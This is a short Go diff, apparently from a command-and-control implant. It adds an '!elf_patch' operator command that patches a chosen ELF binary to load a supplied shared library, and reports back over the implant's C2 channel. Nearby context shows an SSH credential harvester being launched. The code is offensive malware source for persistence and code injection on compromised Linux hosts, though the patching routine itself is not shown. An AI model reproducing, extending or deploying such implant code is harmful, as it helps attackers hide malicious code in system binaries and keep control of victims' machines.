@@ -126,3 +126,27 @@ func runSSHHarvesterLinux(cmd *cobra.Command, args []string) {
 		go modules.SshHarvester(cmd, codePatternBytes, regName)
 	}
 }
+
+// runElfPatchLinux implements: !elf_patch --elf_path <path> --so_path <so_path>
+func runElfPatchLinux(cmd *cobra.Command, args []string) {
+	elfPath, _ := cmd.Flags().GetString("elf_path")
+	soPath, _ := cmd.Flags().GetString("so_path")
+
+	if elfPath == "" {
+		c2transport.C2RespPrintf(cmd, "Error: elf_path is required")
+		return
+	}
+
+	if soPath == "" {
+		c2transport.C2RespPrintf(cmd, "Error: so_path is required")
+		return
+	}
+
+	err := modules.ElfPatcher(elfPath, soPath)
+	if err != nil {
+		c2transport.C2RespPrintf(cmd, "Error: %v", err)
+		return
+	}
+
+	c2transport.C2RespPrintf(cmd, "Successfully patched %s to load %s", elfPath, soPath)
+}
